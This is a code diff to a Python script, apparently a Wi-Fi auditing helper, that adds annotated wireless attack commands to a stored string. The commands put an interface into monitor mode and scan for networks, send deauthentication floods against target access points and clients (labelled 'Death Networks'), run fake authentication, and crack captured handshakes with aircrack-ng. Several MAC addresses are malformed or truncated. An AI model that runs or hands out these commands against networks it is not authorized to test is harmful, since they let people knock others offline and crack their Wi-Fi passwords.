@@ -49,22 +49,40 @@ os.mkdir(sub_five, mode=0o777)
 text_input = 'Text Input - [ PMKID = Only part of the Handshake was aquired ]'
 main_commands = """
 
-iwconfig
+# List available interfaces
+ip link show 
 
-sudo airmon-ng 
+# List available interfaces
+iwconfig 
 
-sudo airmon-ng start wlan0
+# Kill annoying processes
+airmon-ng check kill 
 
-sudo airodump-ng --band a wlan0mon -w main
+# Monitor mode
+airmon-ng start wlan0
 
-airodump-ng wlan0mon -c 11 --bssid E8:2C:6D:00:00 -w <network_name>
+# Managed mode
+airmon-ng stop wlan0mon
 
+# Scan 5Ghz (2.4Ghz Default w/out band a)
+airodump-ng wlan0mon --band a
+
+# Death Networks 
 aireplay-ng -0 15 -a 1C:9E:CC:00:00 -c 3C:2E:FF:00:00
 
 aireplay-ng -1 0 -e teddy -a 00:14:7K:6E:40:80 -h 00:0F:9K:68:9K:82 wlan0mon
 
+# Review pcap file 
 aircrack-ng <Cap File>
 
+# Put in mode monitor
+iwconfig wlan0 mode monitor
+
+# Quit mode monitor - managed mode
+iwconfig wlan0mon mode managed
+
+# Scan available wifis ApPs
+iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" 
 
 """
 tools = """
